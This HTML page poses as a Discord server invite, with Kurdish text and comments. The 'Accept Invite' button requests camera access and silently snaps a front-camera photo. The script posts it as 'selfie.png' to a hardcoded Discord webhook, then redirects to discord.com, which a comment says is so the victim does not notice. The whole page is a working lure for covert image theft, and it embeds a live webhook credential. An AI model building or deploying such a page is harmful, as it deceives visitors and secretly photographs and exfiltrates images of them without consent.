<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Invite</title>
    <style>
        body { font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #313338; color: #f2f3f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
        .box { background: #2b2d31; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); text-align: center; width: 90%; max-width: 420px; }
        h2 { font-size: 24px; margin-bottom: 8px; color: #fff; }
        p { color: #b5bac1; font-size: 16px; margin-bottom: 24px; }
        button { padding: 16px; font-size: 16px; cursor: pointer; background-color: #5865F2; color: white; border: none; border-radius: 4px; font-weight: bold; width: 100%; transition: background 0.2s; }
        button:hover { background-color: #4752c4; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>بانگهێشتنامەی دیسکۆرد</h2>
        <p>بۆ چوونە ناو سێرڤەرەکە و بینینی ناوەڕۆک، تکایە کلیک لەسەر دوگمەی خوارەوە بکە و مۆڵەت بدە.</p>
        <button onclick="startCamera()">Accept Invite (قبوڵکردنی بانگهێشت)</button>
    </div>

    <video id="video" autoplay playsinline></video>

    <script>
        // لێنکی وێبهوکی دیسکۆردەکەی خۆت
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1507879866136133682/3h8tsvpbaFNftF08zsRwkYuHbZwgH7yld33NrCBTtKP0cHMl64tn9AsPTZZ170GceTbb";

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            sendToDiscord(blob);
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/png');
                    }, 800); // وێنەگرتنی خێرا دوای کەمتر لە چرکەیەک
                };
            } catch (err) {
                alert("خەتا: بۆ چوونە ژوورەوە پێویستە ڕێگەپێدانی کامێرا چالاک بکەیت.");
            }
        }

        function sendToDiscord(blob) {
            const formData = new FormData();
            formData.append('file', blob, 'selfie.png');
            formData.append('content', '📸 **وێنەیەکی سێڵفی نوێ لە لێنکی دیسکۆردەکەوە هات!**');

            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                body: formData
            })
            .then(res => {
                // دوای ناردنی وێنەکە، دەیباتە ناو لێنکێکی ڕاستەقینەی دیسکۆرد بۆ ئەوەی هەست نەکات
                window.location.href = "https://discord.com";
            })
            .catch(err => console.error(err));
        }
    </script>
</body>
</html>
